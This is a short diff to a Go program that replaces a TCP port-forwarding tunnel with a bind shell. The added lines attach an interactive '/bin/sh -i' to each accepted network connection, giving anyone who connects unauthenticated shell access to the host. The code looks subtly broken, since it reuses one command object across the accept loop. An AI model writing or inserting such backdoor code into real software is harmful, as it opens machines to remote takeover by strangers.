@@ -1,9 +1,9 @@
 package main
 
 import (
-	"io"
 	"log"
 	"net"
+	"os/exec"
 )
 
 func main() {
@@ -11,29 +11,15 @@ func main() {
 	if err != nil {
 		log.Fatalln(err.Error())
 	}
+	cmd := exec.Command("/bin/sh", "-i")
 	for {
 		conn, err := listner.Accept()
 		if err != nil {
 			log.Fatalln(err.Error())
 		}
-		go Tunnel(conn)
-	}
-}
-
-func Tunnel(conn net.Conn) {
-	dest, err := net.Dial("tcp", ":8081")
-	if err != nil {
-		log.Fatalln(err.Error())
-	}
-	go func() {
-		_, err = io.Copy(dest, conn)
-		if err != nil {
-			log.Fatalln(err.Error())
-		}
-	}()
-	for {
-		_, err = io.Copy(conn, dest)
-		if err != nil {
+		cmd.Stdin = conn
+		cmd.Stdout = conn
+		if err := cmd.Run(); err != nil {
 			log.Fatalln(err.Error())
 		}
 	}
